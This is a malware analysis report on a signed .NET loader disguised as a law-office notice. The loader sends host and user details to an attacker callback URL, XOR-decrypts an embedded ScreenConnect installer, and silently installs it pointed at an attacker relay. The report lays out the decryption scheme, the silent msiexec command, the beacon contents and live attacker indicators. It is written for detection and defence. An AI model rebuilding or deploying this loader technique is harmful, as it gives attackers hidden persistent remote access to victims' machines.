# Malware Analysis Report: Law_Office_of_Roxie_W_Cluck.exe

## 1. File Metadata

| Field | Value |
|---|---|
| Filename | `Law_Office_of_Roxie_W_Cluck.exe` |
| SHA256 | `093db91d8a9c42faf74d6531eacab95e1175952a8defd0a86113ab92403e4f22` |
| SHA1 | `ed8dd923573008a9fd7788f155f4cd000a8467dc` |
| MD5 | `82a8548f6dfdf13ac7c7f2878c4f7704` |
| Size | 38,116,216 bytes (36.3 MB) |
| Type | PE32+ console, x86-64, .NET 8 self-contained single-file bundle (`singlefilehost` + CoreCLR) |
| Imphash | `70d2e884fa127843c5bcbb53da86b6c8` |

**Signing certificate:**
| Field | Value |
|---|---|
| Subject | jasmine mosby (State=AR, Locality=Little Rock, Country=US) |
| Issuer | Microsoft ID Verified CS AOC CA 04 |
| Serial | `3300031f7f74e3961cc7cbffb1000000031f7f` |
| Validity | 2026-07-13 → 2026-07-16 (**3-day validity** — consistent with abuse of Microsoft Trusted Signing "Individual Identity" issuance, a recurring commodity technique across unrelated actors, not specific to any tracked family) |

**Version resource (lure metadata):**
| Field | Value |
|---|---|
| FileDescription | Law Office of Roxie W. Cluck |
| ProductName | Application Manager |
| CompanyName | Atlas Computing Group |
| Comments | Cloud synchronization service |
| InternalName / OriginalFilename | App1bf73ce5.dll |
| FileVersion / ProductVersion | 7.6.67.6 |

**Build artifacts:**
- Native host PDB (standard .NET SDK artifact, not attacker-authored): `D:\a\_work\1\s\artifacts\obj\coreclr\windows.x64.Release\Corehost.Static\singlefilehost.pdb`
- Managed payload PDB (attacker build infra): `/tmp/buildbot_builds/6647091234_1784050018941/obj/Release/net8.0-windows/win-x64/App1bf73ce5.pdb` — a Linux-hosted buildbot path with a numeric build ID, matching the `buildId` embedded in the beacon JSON (see §3). Indicates an automated builder/panel generating per-victim payload bundles.
- Payload DLL debug timestamp is anomalous/fake: `2075-02-26` (malcat flagged `DebugTimeDateStampInTheFuture` / `TimeDateStampInTheFuture`), a common builder artifact of tampered PE timestamps.

## 2. Classification

**Type:** Loader / Dropper deploying a genuine but attacker-configured **ScreenConnect (ConnectWise Control) RMM client** for remote access — "RMM abuse" pattern, delivered under a fake legal-notice lure ("Law Office of Roxie W. Cluck").

**Confidence:** High (confirmed via full static IL recovery + dynamic sandbox validation; the dropped-file hash from ANY.RUN's execution exactly matches the payload independently decrypted from static analysis).

**Family attribution:** None. KesaKode offline hits (ArkanixStealer, Kamasers, ValkyrieStealer, Vulturi, SpushStealer, SvcStealer, XillenStealer) were all ≤0.83% online-confirmed — well under the 20% code-overlap threshold — and are discarded as noise per policy. This sample does not match any previously tracked family/campaign in memory by certificate serial, C2 domain, config values, build artifact, or payload hash; it is analyzed standalone.

## 3. Capabilities

The 38MB outer file is a standard **.NET 8 self-contained single-file publish** — virtually all of its size is the bundled CoreCLR runtime and Base Class Library DLLs (confirmed via `.NET Bundle` manifest enumeration: ~190 stock BCL assemblies). The only attacker-authored logic is the embedded `App1bf73ce5.dll` (2.9 MB manifest, but only ~6 KB / 10 functions of actual IL code). This was fully recovered via IL disassembly:

- **Console hiding**: calls `GetConsoleWindow` + `ShowWindow(hwnd, SW_HIDE)` to hide the console window.
- **Build/beacon telemetry**: fire-and-forget background task POSTs a JSON build-callback to the operator's infrastructure:
  - URL: `https://securefiles-cdn.com/buildcallback`
  - Body: `{"buildId":"6647091234_80","hostname":"<Environment.MachineName>","username":"<Environment.UserName>","publicIp":"Unknown","os":"<Environment.OSVersion>","template":"Law Office of Roxie W. Cluck"}`
- **Embedded resource extraction**: reads two manifest resources — `Build.key.dat` (32-byte XOR key) and `Build.sc.msi.enc` (2,953,216-byte encrypted blob).
- **Payload decryption**: single-byte-repeating XOR: `plaintext[i] = enc[i] XOR key[i % 32]`, writing the result to `%TEMP%\Setup_<8-char-hex>\sc.msi`.
- **Silent install**: `msiexec.exe /i "<path>\sc.msi" /quiet /norestart` (CreateNoWindow=true), waits for exit.
- **Cleanup**: sleeps 3 seconds, then recursively deletes the temp working directory (anti-forensics / low footprint).

The decrypted MSI (`sc.msi`, SHA256 `b0c62d3a100d2b9e7b45798d5adfdeb98e4a6fee31ca39e1550929457cebd93e`) is a **genuine ConnectWise ScreenConnect Client installer**, WiX-built (Windows Installer XML Toolset 3.11.0.1701), version **23.3.21.8818**:
- `ProductName`: `ScreenConnect Client (8ab6eb773f00befb)`
- `ProductCode`: `{B6F3F12A-6E06-40C3-A2D0-1721F3973297}` / `UpgradeCode`: `{015ABAAC-94C3-C34B-8AB6-EB773F00BEFB}`
- Installs as a Windows Service (`ServiceType`=own process, auto-start, LoadOrderGroup="Remote Control")
- Ships the full ScreenConnect client suite: `ScreenConnect.ClientService.exe/dll`, `ScreenConnect.WindowsClient.exe`, `ScreenConnect.WindowsBackstageShell.exe` (remote desktop shell), `ScreenConnect.WindowsCredentialProvider.dll` (credential-provider hook), `ScreenConnect.Core.dll`, `ScreenConnect.Windows.dll`.
- Relay/session parameters are baked into the `SERVICE_CLIENT_LAUNCH_PARAMETERS` MSI property:
  `?e=Access&y=Guest&h=serv.therapasqualis.com&p=8041&k=<RSA-encrypted session key>`
  → points the client at an **attacker-controlled ScreenConnect relay** (`serv.therapasqualis.com:8041`), not the official ScreenConnect cloud, giving the operator persistent full remote-desktop/file/shell access to the victim.

capa could not analyze the outer file (recognized-but-blocked by its ".NET single-file deployment" detection rule, by design — the interesting logic lives in the embedded DLL which was manually extracted and reversed instead). peframe's import/export listing on the outer file reflects only the generic CoreCLR native-host boilerplate (KERNEL32/ADVAPI32/ole32/OLEAUT32/USER32/SHELL32 + `api-ms-win-crt-*`), not attacker logic.

## 4. Attack Chain

1. Victim runs `Law_Office_of_Roxie_W_Cluck.exe` (legal-notice-themed lure), signed with a short-lived Trusted-Signing cert.
2. Native CoreCLR host stub launches the bundled managed entry point (`App1bf73ce5.dll`).
3. Console window is hidden; a background task beacons build/host telemetry to `securefiles-cdn.com/buildcallback`.
4. Embedded `key.dat` + `sc.msi.enc` resources are extracted to a randomized `%TEMP%\Setup_<guid>\` folder and XOR-decrypted into a real ScreenConnect Client MSI.
5. `msiexec /i ... /quiet /norestart` silently installs the ScreenConnect client as a Windows service, pre-configured to phone home to the attacker's relay `serv.therapasqualis.com:8041`.
6. Temp working directory is deleted; the operator now has persistent remote access via the ScreenConnect session.

## 5. IOCs

**Network:**
- `hxxps[://]securefiles-cdn[.]com/buildcallback` — build/host telemetry callback (172.67.164.113, Cloudflare-fronted)
- `securefiles-cdn[.]com` — 172.67.164.113
- `serv[.]therapasqualis[.]com:8041` — attacker-controlled ScreenConnect relay (74.207.198.32)

**Filesystem:**
- `%TEMP%\Setup_<8-char-hex>\key.dat` (transient)
- `%TEMP%\Setup_<8-char-hex>\sc.msi.enc` (transient)
- `%TEMP%\Setup_<8-char-hex>\sc.msi` (transient — deleted after install)
- ScreenConnect install directory (standard MSI `ProgramFiles` location for `ScreenConnect Client (8ab6eb773f00befb)`)

**Registry / Service:**
- Windows Service: `ScreenConnect Client (8ab6eb773f00befb)`

**Hashes:**
- Outer loader: `093db91d8a9c42faf74d6531eacab95e1175952a8defd0a86113ab92403e4f22`
- Embedded managed payload (`App1bf73ce5.dll`): `b8823e08ca17135be90fcfaa07fe12d37303efc7f5b3f79c4a2b64ce9fdffb72`
- Decrypted ScreenConnect MSI (`sc.msi`): `b0c62d3a100d2b9e7b45798d5adfdeb98e4a6fee31ca39e1550929457cebd93e`

## 6. Emulation Results

Speakeasy/angr emulation was **not run** for this sample. The entirety of the attacker-authored logic is managed .NET IL (10 functions, ~6 KB), fully and unambiguously recovered via static IL disassembly (`fn_disassemble`) — including the exact XOR decryption algorithm, which was independently reimplemented and validated (see §7). Native x86/x64 emulation would only exercise CoreCLR's own JIT/bootstrap sequence in the host stub, not the managed payload logic, and would add no analytic value here.

## 7. Sandbox Results (ANY.RUN)

- **Verdict:** 100/100 — **Malicious activity**
- **Tags:** `screenconnect`, `tool`, `rmm-tool`, `remote`, `rat`
- **Public report:** https://app.any.run/tasks/95acc1ad-6a52-4b9a-8e73-b59cead0d3d4
- **Validation:** One of the 15 dropped files recorded by the sandbox (SHA256 `b0c62d3a100d2b9e7b45798d5adfdeb98e4a6fee31ca39e1550929457cebd93e`) is byte-identical to the ScreenConnect MSI independently recovered by manually XOR-decrypting the embedded resources during static analysis — confirming the decryption routine and key were correctly recovered.
- DNS requests observed: `securefiles-cdn.com`, `serv.therapasqualis.com` (matches static findings). No outbound HTTP/HTTPS traffic to non-Microsoft hosts beyond the `buildcallback` POST was recorded; the raw TCP ScreenConnect relay connection (port 8041) was not captured by the IOC-report categories used (DNS/Connections/HTTP), though the domain resolution itself was.

## 8. Analyst Notes

- The "build callback" JSON schema (`buildId`, `template`, machine/user telemetry) and the Linux buildbot PDB path strongly suggest this loader is produced by an automated builder/panel service that stamps a victim/campaign-specific lure name (`template`) and a short-lived code-signing cert per build. The `template` value ("Law Office of Roxie W. Cluck") is likely reused as the social-engineering lure filename/theme for this specific build.
- The actual "malware" payload here is a **legitimate, unmodified commercial RMM client** (ScreenConnect 23.3.21.8818) — the malicious element is entirely in the delivery/configuration (silent, hidden install pointed at a non-official relay), not in the RMM binary itself. This is a well-established technique for establishing durable remote access while evading signature-based detection of the payload itself.
- No file-encryption, credential-theft, or C2-beaconing-beyond-ScreenConnect capability was found in the recovered code; this sample's sole purpose is initial-access/RMM-persistence establishment.
- Recommended follow-up: block/monitor `securefiles-cdn.com` and `serv.therapasqualis.com:8041`; hunt for the ScreenConnect service name `ScreenConnect Client (8ab6eb773f00befb)` and `ProductCode {B6F3F12A-6E06-40C3-A2D0-1721F3973297}` in EDR/MSI installation telemetry, since this ProductCode/relay pair is reusable across victims of the same builder run (`buildId 6647091234_80`).
